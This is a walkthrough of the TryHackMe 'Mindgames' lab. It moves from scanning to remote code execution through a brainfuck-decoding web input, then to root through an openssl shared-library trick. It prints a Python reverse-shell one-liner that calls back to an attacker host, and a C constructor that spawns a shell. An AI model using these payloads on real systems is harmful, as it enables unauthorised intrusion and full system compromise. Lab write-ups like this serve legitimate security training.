# MindGames

“Just a terrible idea...”

A detailed walkthrough on the [TryHackMe](https://tryhackme.com) room [Mindgames](https://tryhackme.com/room/mindgames) by 3J0SKA

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Mindgames/Untitled.png)

## 1- Scanning And Enumerating

Now first we will scan the machine to find any ports. 

For scanning I will be using rustscan. 

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%201.png)

Here we found 2 ports, one running on port 22 (SSH) and the other one running on port 80 (HTTP).

Lets check out the HTTP page now! 

By looking at the HTTP page we can see some decoding happening.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%202.png)

And then we also have a input which can be used to decode the above decoding. But we don’t know the decoding yet.

After researching for a while, I got to know that this decoding is called `brainfuck` so I copied this `Hello, World` code and decoded it.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%203.png)

After decoding this, I found out that the input field actually takes the `brainfuck` decoding and decodes it, after decoding it executes are code.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%204.png)

And here in this case the code is written in python, So to make sure we can actually execute command on the system using python I made a simple script which executes the command `ls` on the system. 

Here’s the script : 

```python
import os;os.system("ls")
```

So here we have our script, but before we can execute it we have to covert it to `brainfuck` encoding. Here’s what I got!

So let’s execute the code.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%205.png)

Here you go! It works and we can execute python scripts on the system. Now the obvious thing to do is to execute a reverse shell on the system!

Here is the code I used to do that : 

```python
import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```

You have to make sure that the script doesn’t use any libraries that can’t be used without installing.

And after executing the code you should have a reverse connect! 

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%206.png)

Now as we have the foothold of the system, lets get the `user.txt` file!

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%207.png)

![https://c.tenor.com/TPXMriXwLD4AAAAC/lets-go-the-rock.gif](https://c.tenor.com/TPXMriXwLD4AAAAC/lets-go-the-rock.gif)

## 2- Privilege Escalation!

Now we have a foothold on the system and we also got our user.txt flag, now its time to get `root.txt`

I tried all of basic privilege escalation techniques like sudo files or suid, but could do anything with them. Now we will use `[linpeas.sh](http://linpeas.sh)` to get more information.

First we have to get the file on the system, to do that lets set up a Python server.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%208.png)

Now we can `wget` the file. 

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%209.png)

Now you can execute the file, after giving it the permissions using `chmod`. 

So after sometime I found this in the linpeas scan.

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%2010.png)

So I immediately searched for this on [`https://gtfobins.github.io`](https://gtfobins.github.io/) and found this. 

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%2011.png)

I couldn’t understand what this command was doing and it was also throwing a error, so I decided to find something else for the privilege escalation. 

After searching for it, I came across this pull request on github : [https://github.com/GTFOBins/GTFOBins.github.io/pull/125#issuecomment-612586734](https://github.com/GTFOBins/GTFOBins.github.io/pull/125#issuecomment-612586734)

And it had this C code : 

```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "sh", NULL);
}
```

Now save this in a file and compile it using `gcc` on your system and then transfer the file to the victim machine. 

Make sure you save your file with the name `openssl.c` or it might not work

Here are the commands to execute : 

```bash
gcc -fPIC -o openssl.o -c openssl.c
gcc -shared -o openssl.so openssl.o
```

Now you should have a file named `[open.so](http://open.so)` that you have to send to the machine using wget.

After that you have to give permissions to the file. 

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%2012.png)

And now you can execute the script!

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%2013.png)

Hurray!!! We got the root privileges! 

Now you can find the flag at `/root/root.txt`

![Untitled](MindGames%20735347bab3804dfe9220e0c24586ed04/Untitled%2014.png)

![https://c.tenor.com/HJ0iSKwIG28AAAAC/yes-baby.gif](https://c.tenor.com/HJ0iSKwIG28AAAAC/yes-baby.gif)